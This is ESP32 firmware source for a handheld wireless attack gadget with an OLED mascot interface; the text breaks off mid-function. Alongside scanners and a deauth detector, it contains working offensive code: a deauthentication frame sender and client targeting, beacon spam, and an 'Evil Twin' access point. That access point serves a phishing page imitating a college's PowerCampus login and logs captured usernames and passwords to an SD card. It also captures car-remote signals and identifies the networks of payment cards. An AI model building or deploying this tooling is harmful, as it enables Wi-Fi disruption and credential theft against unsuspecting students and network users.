#include <Arduino.h>
#include <U8g2lib.h>
#include <Wire.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "driver/gpio.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>
#include <Adafruit_PN532.h>

// === DISPLAY ===
U8G2_SH1106_128X64_NONAME_F_HW_I2C display(U8G2_R0, U8X8_PIN_NONE);

// === PIN DEFINITIONS ===
#define PIN_CC_CS  15
#define PIN_SD_CS   5
#define PIN_NFC_SS 27
#define PIN_NFC_RST 13

// === BUTTONS ===
#define BTN_LEFT  14
#define BTN_UP    26
#define BTN_RIGHT 32
#define BTN_DOWN  33
#define DEBOUNCE_MS 50

struct BtnState { uint8_t pin; bool last; unsigned long t; };
BtnState btns[4] = {
  {BTN_UP,    true, 0},
  {BTN_DOWN,  true, 0},
  {BTN_RIGHT, true, 0},
  {BTN_LEFT,  true, 0},
};
const char btnKeys[4] = {'w', 's', 'e', 'q'};

void initButtons() {
  pinMode(BTN_UP,    INPUT_PULLUP);
  pinMode(BTN_DOWN,  INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_LEFT,  INPUT_PULLUP);
}

char readButtons() {
  unsigned long now = millis();
  for (int i = 0; i < 4; i++) {
    bool state = digitalRead(btns[i].pin);
    if (state != btns[i].last && (now - btns[i].t) > DEBOUNCE_MS) {
      btns[i].last = state;
      btns[i].t = now;
      if (state == LOW) return btnKeys[i];
    }
  }
  return 0;
}

// ============================================================
// MASCOT MOOD SYSTEM
// ============================================================

enum MoodType {
  MOOD_IDLE,
  MOOD_HAPPY,
  MOOD_THINKING,
  MOOD_SAD,
  MOOD_ANGRY,
  MOOD_SLEEPING,
  MOOD_SUCCESS,
  MOOD_FAIL,
  MOOD_WORKING,
  MOOD_WAVING   // animated wave — used during WiFi scan
};

bool reactionActive       = false;
unsigned long reactionStart = 0;
MoodType reactionMood     = MOOD_IDLE;
char reactionLine1[22]    = {0};
char reactionLine2[22]    = {0};
unsigned long lastInputTime = 0;
#define REACTION_MS   2000
#define SLEEP_TIMEOUT 30000

void triggerReaction(MoodType mood, const char* l1, const char* l2 = nullptr) {
  reactionMood = mood;
  strncpy(reactionLine1, l1, 21);
  strncpy(reactionLine2, l2 ? l2 : "", 21);
  reactionActive  = true;
  reactionStart   = millis();
}

// Draw the robot-panda mascot at head-center (cx, cy)
void drawMascot(int cx, int cy, MoodType mood) {

  // Head
  display.drawDisc(cx, cy, 8);
  display.drawDisc(cx-6, cy-7, 3);
  display.drawDisc(cx+6, cy-7, 3);
  display.setDrawColor(0);
  display.drawBox(cx-5, cy-4, 10, 4);
  display.setDrawColor(1);

  // Eyes
  if (mood == MOOD_SLEEPING) {
    display.drawHLine(cx-4, cy-2, 3);
    display.drawHLine(cx+1, cy-2, 3);
  } else {
    display.drawDisc(cx-3, cy-2, 1);
    display.drawDisc(cx+3, cy-2, 1);
    if (mood == MOOD_ANGRY) {
      display.drawLine(cx-5, cy-4, cx-1, cy-3);
      display.drawLine(cx+5, cy-4, cx+1, cy-3);
    }
  }

  // Mouth
  switch (mood) {
    case MOOD_HAPPY: case MOOD_SUCCESS: case MOOD_WAVING:
      display.drawPixel(cx-3,cy+4); display.drawPixel(cx-2,cy+5);
      display.drawPixel(cx-1,cy+5); display.drawPixel(cx,cy+5);
      display.drawPixel(cx+1,cy+5); display.drawPixel(cx+2,cy+5);
      display.drawPixel(cx+3,cy+4); break;
    case MOOD_SAD: case MOOD_FAIL:
      display.drawPixel(cx-3,cy+5); display.drawPixel(cx-2,cy+4);
      display.drawPixel(cx-1,cy+4); display.drawPixel(cx,cy+4);
      display.drawPixel(cx+1,cy+4); display.drawPixel(cx+2,cy+4);
      display.drawPixel(cx+3,cy+5); break;
    case MOOD_THINKING: case MOOD_WORKING:
      display.drawFrame(cx-1, cy+4, 3, 3); break;
    case MOOD_ANGRY:
      display.drawHLine(cx-3,cy+5,6);
      display.drawHLine(cx-2,cy+4,4); break;
    case MOOD_SLEEPING:
      display.drawHLine(cx-2,cy+5,4); break;
    default:
      display.drawHLine(cx-3,cy+5,6);
  }

  // Body — bY declared ONCE here, before arms switch
  int bY = cy + 9;
  display.drawBox(cx-6, bY, 12, 9);
  display.setDrawColor(0);
  display.drawBox(cx-2, bY+2, 5, 4);
  display.setDrawColor(1);

  // Arms — MOOD_WAVING appears exactly ONCE
  switch (mood) {
    case MOOD_WAVING:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      if ((millis()/250)%2 == 0) {
        display.drawLine(cx+6, bY, cx+11, bY-6);
        display.drawDisc(cx+11, bY-8, 2);
      } else {
        display.drawLine(cx+6, bY+2, cx+10, bY-1);
        display.drawDisc(cx+10, bY-3, 2);
      }
      break;
    case MOOD_HAPPY:
      display.drawLine(cx-6, bY+2, cx-10, bY-3);
      display.drawLine(cx+6, bY+2, cx+10, bY-3); break;
    case MOOD_SUCCESS:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      display.drawLine(cx+6, bY+2, cx+10, bY-3);
      display.drawDisc(cx+10, bY-5, 2); break;
    case MOOD_THINKING: case MOOD_WORKING:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      display.drawLine(cx+6, bY+3, cx+4, bY+8);
      display.drawDisc(cx+3, bY+9, 2); break;
    case MOOD_SAD: case MOOD_FAIL:
      display.drawLine(cx-6, bY+4, cx-10, bY+9);
      display.drawLine(cx+6, bY+4, cx+10, bY+9); break;
    case MOOD_ANGRY:
      display.drawLine(cx-6, bY+2, cx-11, bY-3);
      display.drawDisc(cx-11, bY-5, 2);
      display.drawLine(cx+6, bY+2, cx+11, bY-3);
      display.drawDisc(cx+11, bY-5, 2); break;
    case MOOD_SLEEPING:
      display.drawLine(cx-6, bY+5, cx-9, bY+9);
      display.drawLine(cx+6, bY+5, cx+9, bY+9); break;
    default:
      display.drawLine(cx-6, bY+3, cx-9, bY+7);
      display.drawLine(cx+6, bY+3, cx+9, bY+7);
  }

  // Legs
  int lY = bY + 9;
  display.drawBox(cx-5, lY, 3, 5);
  display.drawBox(cx+2, lY, 3, 5);
  display.drawBox(cx-6, lY+3, 5, 3);
  display.drawBox(cx+1, lY+3, 5, 3);
}
  // --- Head (filled) ---
  
void drawReactionScreen() {
  display.clearBuffer();

  drawMascot(22, 20, reactionMood);

  display.drawVLine(46, 8, 48);

  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(50, 22, reactionLine1);
  if (strlen(reactionLine2) > 0) {
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(50, 35, reactionLine2);
  }

  // Mood extras
  switch (reactionMood) {
    case MOOD_SUCCESS:
    case MOOD_HAPPY:
      // confetti dots
      display.drawPixel(52, 5); display.drawPixel(60, 8);
      display.drawPixel(68, 4); display.drawPixel(76, 7);
      display.drawPixel(84, 3); display.drawPixel(56, 10);
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(50, 56, "!! NICE !!");
      break;
    case MOOD_FAIL:
    case MOOD_SAD:
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(50, 56, "try again...");
      break;
    case MOOD_THINKING:
    case MOOD_WORKING: {
      int dots = (millis() / 350) % 4;
      char d[5] = "    ";
      for (int i = 0; i < dots; i++) d[i] = '.';
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(50, 56, d);
      break;
    }
    case MOOD_SLEEPING:
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(10, 8, "z");
      display.drawStr(17, 5, "z");
      display.drawStr(24, 2, "Z");
      break;
    case MOOD_ANGRY:
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(50, 56, "ATTACKING!");
      break;
    default: break;
  }
  display.sendBuffer();
}

void drawBootAnimation() {
  // Phase 1: character walks in from left
  for (int x = -15; x <= 22; x += 5) {
    display.clearBuffer();
    drawMascot(x, 28, MOOD_HAPPY);
    display.sendBuffer();
    delay(55);
  }
  // Phase 2: VARIONE text appears
  display.clearBuffer();
  drawMascot(22, 28, MOOD_HAPPY);
  display.setFont(u8g2_font_helvB12_tr);
  display.drawStr(46, 34, "VARIONE");
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(46, 48, "v0.4");
  display.sendBuffer();
  delay(600);
  // Phase 3: wave animation (3 times)
  for (int i = 0; i < 3; i++) {
    display.clearBuffer();
    drawMascot(22, 28, MOOD_HAPPY);
    display.setFont(u8g2_font_helvB12_tr);
    display.drawStr(46, 34, "VARIONE");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(46, 48, "v0.4");
    display.sendBuffer();
    delay(220);
    display.clearBuffer();
    drawMascot(22, 28, MOOD_IDLE);
    display.setFont(u8g2_font_helvB12_tr);
    display.drawStr(46, 34, "VARIONE");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(46, 48, "v0.4");
    display.sendBuffer();
    delay(220);
  }
  delay(200);
}

// ============================================================
// PORTAL HTML
// ============================================================

const char ET_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CIC Self-Service</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;font-size:13px;background:#f0f0f0}
.hdr{background:#7B1818;padding:7px 10px;display:flex;align-items:center}
.logo{color:#fff;display:flex;align-items:center;gap:6px}
.logo .leaf{font-size:22px;line-height:1}
.logo .txt b{font-size:14px;display:block}
.logo .txt span{font-size:9px;color:#ffcccc}
.nav{background:#7B1818;border-top:1px solid #9b3030;display:flex;padding:0 8px}
.nav a{color:#fff;text-decoration:none;padding:5px 10px;font-size:12px;display:inline-block}
.nav a.act{background:#fff;color:#7B1818;font-weight:bold}
.layout{display:flex;min-height:300px;background:#fff}
.side{width:108px;min-width:108px;border-right:1px solid #ccc;padding:6px}
.lpanel{border:1px solid #aaa}
.lhdr{background:#ccc;padding:3px 6px;font-size:11px;font-weight:bold;display:flex;justify-content:space-between}
.lbody{padding:7px 6px}
.lbody label{display:block;font-size:11px;margin-bottom:2px;color:#222}
.lbody input{width:100%;padding:3px;border:1px solid #888;font-size:12px;margin-bottom:5px}
.lbtn{width:100%;background:#7B1818;color:#fff;border:none;padding:4px;font-size:12px;cursor:pointer}
.main{flex:1}
.campus-img{background:#b0b8c0;height:110px;display:flex;align-items:center;justify-content:center;color:#555;font-size:11px}
.sbar{background:#7B1818;color:#fff;padding:5px 10px;font-size:12px}
.content{padding:6px 10px}
.content a{font-size:11px;color:#7B1818;text-decoration:none}
.ft{background:#7B1818;color:#ffcccc;text-align:center;padding:5px;font-size:10px}
</style></head><body>
<div class="hdr"><div class="logo"><div class="leaf">&#127809;</div>
<div class="txt"><b>CANADIAN <span style="font-weight:normal">PowerCampus</span></b>
<span>INTERNATIONAL COLLEGE &nbsp; by Ellucian&#8482;</span></div></div></div>
<div class="nav"><a href="#" class="act">Home</a><a href="#">Search</a><a href="#">Apply</a></div>
<div class="layout">
<div class="side"><div class="lpanel">
<div class="lhdr">Login <span>&#9650;</span></div>
<div class="lbody"><form action="/login" method="POST">
<label>User Name</label><input type="text" name="u" autocomplete="username" required>
<label>Password</label><input type="password" name="p" autocomplete="current-password" required>
<button class="lbtn" type="submit">Log In</button>
</form></div></div></div>
<div class="main"><div class="campus-img">[ CIC Campus ]</div>
<div class="sbar">Students &nbsp;|</div>
<div class="content"><a href="#">&#9658; Find Courses</a></div></div></div>
<div class="ft">PowerCampus&#174; Self-Service 8.8.3 &middot; Copyright 1995-2018 Ellucian Company L.P.</div>
</body></html>
)rawliteral";

const char ET_SUCCESS[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connecting...</title>
<style>body{font-family:Arial;text-align:center;padding:60px 20px;background:#dde3ea}
.box{background:#fff;padding:30px 40px;border-radius:8px;display:inline-block;max-width:320px}
h2{color:#003366;margin-top:0}p{color:#555;font-size:14px}
.spinner{border:3px solid #eee;border-top:3px solid #003366;border-radius:50%;width:32px;height:32px;
animation:spin 1s linear infinite;margin:16px auto}
@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div class="box"><h2>&#10003; Login Successful</h2>
<div class="spinner"></div><p>Authenticating...<br>connecting to network.</p></div></body></html>
)rawliteral";

// ============================================================
// APP STATES
// ============================================================

enum AppState {
  STATE_MENU,
  STATE_WIFI_SCAN,
  STATE_WIFI_RESULTS,
  STATE_PACKET_MONITOR,
  STATE_PROBE_SNIFF,
  STATE_DEAUTH_DETECT,
  STATE_DEAUTH_TARGET,
  STATE_DEAUTH_CLIENT_SCAN,
  STATE_DEAUTH_CLIENT_SELECT,
  STATE_DEAUTH_ATTACK,
  STATE_BEACON_SPAM,
  STATE_ET_TARGET,
  STATE_ET_RUNNING,
  STATE_SUBGHZ,
  STATE_NFC,
  STATE_IR,
  STATE_ABOUT
};
AppState currentState = STATE_MENU;

// === MENU ===
const char* menuItems[] = {
  "WiFi Scanner",
  "Packet Monitor",
  "Probe Sniffer",
  "Deauth Detector",
  "Deauth Attack",
  "Beacon Spam",
  "Evil Twin AP",
  "Sub-GHz",
  "NFC Reader",
  "IR Remote",
  "About"
};
const int menuCount = 11;
int menuIndex = 0;

// === WIFI DATA ===
struct WifiNetwork {
  String ssid;
  int rssi;
  int encryption;
  int channel;
  uint8_t bssid[6];
};
WifiNetwork wifiNets[20];
int wifiCount = 0;
int wifiScroll = 0;

// === PACKET MONITOR ===
volatile int channelPackets[15];
int channelPeaks[15];
int currentChannel = 1;
unsigned long lastChannelHop = 0;
unsigned long lastMonitorDraw = 0;
int totalPackets = 0;
bool monitorActive = false;

// === PROBE SNIFFER ===
struct ProbeRequest { char ssid[33]; int8_t rssi; uint8_t mac[6]; };
ProbeRequest probes[20];
int probeCount = 0;
int probeScroll = 0;
bool probeActive = false;

// === DEAUTH DETECTOR ===
volatile int deauthCount = 0;
volatile int totalMonitored = 0;
unsigned long deauthStart = 0;
bool deauthActive = false;
int deauthHistory[64];
int deauthHistIdx = 0;

// === DEAUTH ATTACK ===
int deauthTargetIdx = 0, deauthTargetScroll = 0;
struct ClientMAC { uint8_t mac[6]; };
ClientMAC clients[16];
volatile int clientCount = 0;
int clientSelectIdx = 0, clientSelectScroll = 0;
bool clientScanActive = false;
int deauthFrameCount = 0;
bool deauthAttackActive = false;
unsigned long lastDeauthSend = 0;
bool attackTargetAll = true;
uint8_t attackClientMAC[6];
#define CLIENT_SCAN_MS 10000
unsigned long clientScanStart = 0;

// === BEACON SPAM ===
const char* spamSSIDs[] = {
  "FBI Surveillance Van", "Not An FBI Van", "Pretty Fly for a WiFi",
  "Bill Wi the Science Fi", "The LAN Before Time", "Virus.exe",
  "Free WiFi Totally Safe", "Router McRouterface", "404 WiFi Not Found",
  "Hack The Planet", "Loading...", "CIC Lab Network",
  "VariOne Was Here", "No Internet Access", "dontconnect",
  "SkyNet Node 7", "HackMe If You Can", "ESP32 AP",
  "Abraham Linksys", "It Hurts When IP"
};
const int spamSSIDCount = 20;
bool beaconSpamActive = false;
int beaconFrameCount = 0, beaconSSIDIdx = 0, beaconChannelIdx = 0;
unsigned long lastBeaconSend = 0;
const uint8_t beaconChannels[] = {1, 6, 11};
uint8_t spamMACs[20][6];

// === EVIL TWIN ===
DNSServer dnsServer;
WebServer webServer(80);
bool etActive = false;
int etTargetIdx = 0, etTargetScroll = 0;
int etCredCount = 0;
char etLastUser[33] = {0};
char etLastPass[33] = {0};
unsigned long lastEtDraw = 0;

// === SUB-GHZ (CC1101) ===
RCSwitch rcSwitch = RCSwitch();
bool cc1101Ok = false;

struct SubGhzCapture {
  unsigned long value;
  unsigned int  bitLen;
  unsigned int  protocol;
  unsigned int  pulseLen;
  bool          valid;
};
SubGhzCapture sgCapture = {0, 0, 0, 0, false};

#define SG_WAVE_SAMPLES 128
uint8_t sgWave[SG_WAVE_SAMPLES];
bool    sgWaveReady = false;
unsigned long sgLastReceived = 0;
bool    sgListening = false;
int     sgPulseCount = 0;
bool    sgArmed = false;
unsigned long sgArmTime = 0;
int     sgBaselineRssi = -100;
int     sgNoiseFloor = -100;
#define SG_ARM_WINDOW 3000

uint8_t cc1101ReadReg(uint8_t addr) {
  digitalWrite(15, LOW);
  delayMicroseconds(10);
  SPI.transfer(addr | 0x80);
  uint8_t val = SPI.transfer(0x00);
  digitalWrite(15, HIGH);
  return val;
}

void initCC1101() {
  SPI.begin(18, 19, 23, 15);
  pinMode(15, OUTPUT);
  digitalWrite(15, HIGH);
  delay(100);

  // Raw SPI diagnostic — read PARTNUM(0xF0) and VERSION(0xF1)
  SPI.beginTransaction(SPISettings(4000000, MSBFIRST, SPI_MODE0));
  uint8_t partnum = cc1101ReadReg(0xF0);
  uint8_t version = cc1101ReadReg(0xF1);
  SPI.endTransaction();
  Serial.printf("[CC1101] RAW partnum=0x%02X version=0x%02X\n", partnum, version);
  // Expected: partnum=0x00 version=0x04 or 0x14
  // All 0xFF = MISO floating (loose wire)
  // All 0x00 = MOSI/SCK issue

  ELECHOUSE_cc1101.setSpiPin(18, 19, 23, 15);
  ELECHOUSE_cc1101.setGDO0(4);
  delay(50);
  // Skip getCC1101() — raw SPI confirms chip present (partnum=0x00 version=0x14)
  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.SpiWriteReg(0x00, 0x0E);  // IOCFG0 = carrier sense
  ELECHOUSE_cc1101.SetRx();
  cc1101Ok = true;
  Serial.println("[CC1101] OK");
}

void captureRawSignal() {
  // Wait for signal start — 100ms timeout
  unsigned long t = millis();
  while (!digitalRead(4) && millis() - t < 100);
  if (!digitalRead(4)) return;

  // Sample 128 points at 150us each = ~19ms window, higher resolution
  for (int i = 0; i < SG_WAVE_SAMPLES; i++) {
    sgWave[i] = digitalRead(4);
    delayMicroseconds(150);
  }

  // Count transitions
  sgPulseCount = 0;
  for (int i = 1; i < SG_WAVE_SAMPLES; i++)
    if (sgWave[i] != sgWave[i-1]) sgPulseCount++;

  sgWaveReady    = true;
  sgLastReceived = millis();

  Serial.printf("[CC1101] pulses=%d\n", sgPulseCount);

  // Car remote (KeeLoq) = 60+ transitions. Doorbells/sensors = <50.
  if (sgPulseCount >= 18) {
    sgCapture.valid = true;
    triggerReaction(MOOD_SUCCESS, "Car remote!", "433MHz");
  } else {
    Serial.printf("[CC1101] Ignored (%d pulses, not car remote)\n", sgPulseCount);
  }
}

void startSubGhz() {
  if (!cc1101Ok) return;
  sgCapture.valid = false;
  sgWaveReady     = false;
  sgListening     = true;
  // Calibrate noise floor over 500ms
  int sum = 0;
  for (int i = 0; i < 20; i++) { sum += ELECHOUSE_cc1101.getRssi(); delay(25); }
  sgNoiseFloor = sum / 20;
  Serial.printf("[CC1101] Noise floor: %ddBm\n", sgNoiseFloor);
  triggerReaction(MOOD_WORKING, "Sub-GHz", "listening...");
}

void stopSubGhz() {
  sgListening = false;
}

// === NFC (PN532 via I2C) ===
Adafruit_PN532 nfc532(255, 255);  // I2C mode, no IRQ/RST pins needed

struct NfcCard {
  char uid[22];
  char type[22];
  char network[14];
  uint8_t sak;
  bool valid;
};
NfcCard nfcCard = {"", "", "", 0, false};
bool nfcReady = false;
unsigned long nfcLastScan = 0;

static const char* nfcNetworkFromAID(const uint8_t* aid, uint8_t len) {
  if (len < 5) return nullptr;
  if (memcmp(aid, "\xA0\x00\x00\x00\x03", 5) == 0) return "Visa";
  if (memcmp(aid, "\xA0\x00\x00\x00\x04", 5) == 0) return "Mastercard";
  if (memcmp(aid, "\xA0\x00\x00\x00\x25", 5) == 0) return "Amex";
  if (memcmp(aid, "\xA0\x00\x00\x00\x65", 5) == 0) return "JCB";
  if (memcmp(aid, "\xA0\x00\x00\x06\x86", 5) == 0) return "Interac";
  return nullptr;
}

static void nfcTryEMVNetwork(NfcCard& card) {
  // SELECT PPSE
  uint8_t apdu[] = {
    0x00, 0xA4, 0x04, 0x00, 0x0E,
    '2','P','A','Y','.','S','Y','S','.','D','D','F','0','1',
    0x00
  };
  uint8_t rsp[64]; uint8_t rspLen = sizeof(rsp);
  if (!nfc532.inDataExchange(apdu, sizeof(apdu), rsp, &rspLen)) return;
  if (rspLen < 4) return;

  // BER-TLV parse: find tag 0x4F (AID)
  uint8_t* p   = rsp;
  uint8_t* end = rsp + rspLen - 2; // skip SW1/SW2
  while (p < end - 1) {
    uint8_t tag  = *p++;
    uint8_t tlen = *p++;
    if (p + tlen > end) break;
    if (tag == 0x4F && tlen >= 5) {
      const char* net = nfcNetworkFromAID(p, tlen);
      if (net) { strncpy(card.network, net, 13); return; }
    }
    p += tlen;
  }
}

void nfcReadCard() {
  // Fast NACK check — endTransmission returns instantly if device absent
  // avoids 6s blocking inside readPassiveTargetID on missing PN532
  Wire.beginTransmission(0x24);
  if (Wire.endTransmission() != 0) {
    Serial.println("[NFC] PN532 not on bus (0x24)");
    return;
  }
  uint8_t uid[7]; uint8_t uidLen = 0;
  if (!nfc532.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 50)) {
    Serial.println("[NFC] No card");
    return;
  }

  nfcCard.valid = true;
  nfcCard.sak   = 0;
  strncpy(nfcCard.network, "", 1);

  // UID string
  char* p = nfcCard.uid;
  for (uint8_t i = 0; i < uidLen; i++) {
    if (i) p += snprintf(p, 4, ":%02X", uid[i]);
    else    p += snprintf(p, 3, "%02X",  uid[i]);
  }

  // Probe card type: try SELECT PPSE first (EMV/payment card)
  nfcTryEMVNetwork(nfcCard);

  if (strlen(nfcCard.network) > 0) {
    strncpy(nfcCard.type, "EMV Payment", 21);
  } else if (strlen(nfcCard.network) == 0) {
    // Fallback: classify by UID length
    // 4-byte → MIFARE Classic/Mini, 7-byte → MIFARE Ultralight/NTAG
    // EMV cards also have 4/7 byte UIDs so check APDU result first (done above)
    if (uidLen == 4) strncpy(nfcCard.type, "MIFARE Classic", 21);
    else if (uidLen == 7) strncpy(nfcCard.type, "MIFARE Ultralt", 21);
    else snprintf(nfcCard.type, 21, "ISO14443 %db", uidLen);
  }

  Serial.printf("[NFC] UID=%s type=%s network=%s\n",
    nfcCard.uid, nfcCard.type, nfcCard.network);

  if (strlen(nfcCard.network) > 0)
    triggerReaction(MOOD_SUCCESS, nfcCard.network, nfcCard.uid);
  else
    triggerReaction(MOOD_HAPPY, nfcCard.type, nfcCard.uid);

  nfcLastScan = millis();
}

void initNFC() {
  nfc532.begin();
  Wire.setTimeOut(80);  // after begin() so it isn't reset — limits each I2C call to 80ms
  nfcReady = true;      // skip getFirmwareVersion() at boot, verified on first scan
  Serial.println("[NFC] PN532 init done");
}

// === SD CARD ===
bool sdAvailable = false;

void initSD() {
  if (SD.begin(PIN_SD_CS)) {
    sdAvailable = true;
    Serial.println("[SD] Card ready");
    if (!SD.exists("/creds.txt")) {
      File f = SD.open("/creds.txt", FILE_WRITE);
      if (f) { f.println("VariOne v0.4 - Credential Log"); f.println("=============================="); f.close(); }
    }
  } else {
    Serial.println("[SD] No card - serial only");
  }
}

void sdLogCred(const char* user, const char* pass) {
  if (!sdAvailable) return;
  File f = SD.open("/creds.txt", FILE_APPEND);
  if (f) { f.printf("[%lus] user=%s pass=%s\n", millis()/1000, user, pass); f.close(); Serial.println("[SD] Saved"); }
}

void sdPrintAllCreds() {
  if (!sdAvailable) { Serial.println("[SD] No card"); return; }
  File f = SD.open("/creds.txt", FILE_READ);
  if (!f) { Serial.println("[SD] Cannot open creds.txt"); return; }
  Serial.println("\n[SD] === ALL CREDENTIALS ===");
  while (f.available()) Serial.write(f.read());
  Serial.println("[SD] === END ===\n");
  f.close();
}

// ============================================================
// BEACON HELPERS
// ============================================================

void generateSpamMACs() {
  for (int i = 0; i < spamSSIDCount; i++) {
    spamMACs[i][0]=0x02|(i&0xFC); spamMACs[i][1]=0x13+i;
    spamMACs[i][2]=0xAB-i;        spamMACs[i][3]=0x45+(i*7);
    spamMACs[i][4]=0xCD^i;        spamMACs[i][5]=0xEF+(i*3);
  }
}

// ============================================================
// DEAUTH FRAME
// ============================================================

uint8_t deauthFrame[26] = {
  0xC0,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x07,0x00
};

void sendDeauthFrame(const uint8_t* apBSSID, const uint8_t* destMAC) {
  memcpy(&deauthFrame[4],  destMAC, 6);
  memcpy(&deauthFrame[10], apBSSID, 6);
  memcpy(&deauthFrame[16], apBSSID, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
}

// ============================================================
// PROMISCUOUS CALLBACKS
// ============================================================

void IRAM_ATTR packetMonitorCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!monitorActive) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int ch = pkt->rx_ctrl.channel;
  if (ch >= 1 && ch <= 14) channelPackets[ch]++;
  totalPackets++;
}

void IRAM_ATTR probeCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!probeActive) return;
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 28 || frame[0] != 0x40 || len < 26) return;
  uint8_t ssidLen = frame[25];
  if (ssidLen == 0 || ssidLen > 32 || 26 + ssidLen > len) return;
  char ssid[33] = {0};
  memcpy(ssid, &frame[26], ssidLen);
  for (int i = 0; i < probeCount; i++)
    if (strcmp(probes[i].ssid, ssid) == 0 && memcmp(probes[i].mac, &frame[10], 6) == 0) return;
  if (probeCount >= 20) return;
  memcpy(probes[probeCount].ssid, ssid, 33);
  probes[probeCount].rssi = pkt->rx_ctrl.rssi;
  memcpy(probes[probeCount].mac, &frame[10], 6);
  probeCount++;
  triggerReaction(MOOD_HAPPY, "Probe found!", probes[probeCount-1].ssid);
}

void IRAM_ATTR deauthCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!deauthActive) return;
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  totalMonitored++;
  if (pkt->payload[0] == 0xC0 || pkt->payload[0] == 0xA0) deauthCount++;
}

void IRAM_ATTR clientScanCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!clientScanActive) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;
  const uint8_t* targetBSSID = wifiNets[deauthTargetIdx].bssid;
  const uint8_t* addr1=&f[4], *addr2=&f[10], *addr3=&f[16];
  const uint8_t* clientMAC = nullptr;
  if (type == WIFI_PKT_DATA) {
    bool toDS=(f[1]&0x01), fromDS=(f[1]&0x02);
    if (!toDS&&!fromDS) { if(memcmp(addr3,targetBSSID,6)==0&&!(addr2[0]&0x01)) clientMAC=addr2; }
    else if (!toDS&&fromDS) { if(memcmp(addr2,targetBSSID,6)==0&&!(addr1[0]&0x01)) clientMAC=addr1; }
    else if (toDS&&!fromDS) { if(memcmp(addr1,targetBSSID,6)==0&&!(addr2[0]&0x01)) clientMAC=addr2; }
  } else {
    if (memcmp(addr3,targetBSSID,6)==0&&memcmp(addr2,targetBSSID,6)!=0&&!(addr2[0]&0x01)) clientMAC=addr2;
    if (!clientMAC&&memcmp(addr2,targetBSSID,6)==0&&memcmp(addr1,targetBSSID,6)!=0&&!(addr1[0]&0x01)) clientMAC=addr1;
  }
  if (!clientMAC||clientCount>=16) return;
  for (int i=0;i<clientCount;i++) if(memcmp(clients[i].mac,clientMAC,6)==0) return;
  memcpy(clients[clientCount].mac,clientMAC,6);
  clientCount++;
}

// === PROMISCUOUS HELPERS ===
void startPromiscuous(wifi_promiscuous_cb_t cb) {
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(cb);
}
void stopPromiscuous() {
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}

// ============================================================
// EVIL TWIN WEB HANDLERS
// ============================================================

void etServePortal() { webServer.send_P(200, "text/html", ET_HTML); }

void etHandleLogin() {
  String user = webServer.arg("u");
  String pass = webServer.arg("p");
  strncpy(etLastUser, user.c_str(), 32);
  strncpy(etLastPass, pass.c_str(), 32);
  etCredCount++;
  Serial.printf("\n[EVIL TWIN] === CREDENTIAL #%d ===\n", etCredCount);
  Serial.printf("[EVIL TWIN] User: %s\n", etLastUser);
  Serial.printf("[EVIL TWIN] Pass: %s\n\n", etLastPass);
  sdLogCred(etLastUser, etLastPass);
  triggerReaction(MOOD_SUCCESS, "Got creds!", etLastUser);
  webServer.send_P(200, "text/html", ET_SUCCESS);
}

void etRedirect() {
  webServer.sendHeader("Location", "http://192.168.4.1/", true);
  webServer.send(302, "text/plain", "");
}

void etSetupWebServer() {
  webServer.on("/", HTTP_GET, etServePortal);
  webServer.on("/login", HTTP_POST, etHandleLogin);
  webServer.on("/generate_204",              HTTP_GET, etRedirect);
  webServer.on("/gen_204",                   HTTP_GET, etRedirect);
  webServer.on("/hotspot-detect.html",       HTTP_GET, etRedirect);
  webServer.on("/library/test/success.html", HTTP_GET, etRedirect);
  webServer.on("/connecttest.txt",           HTTP_GET, etRedirect);
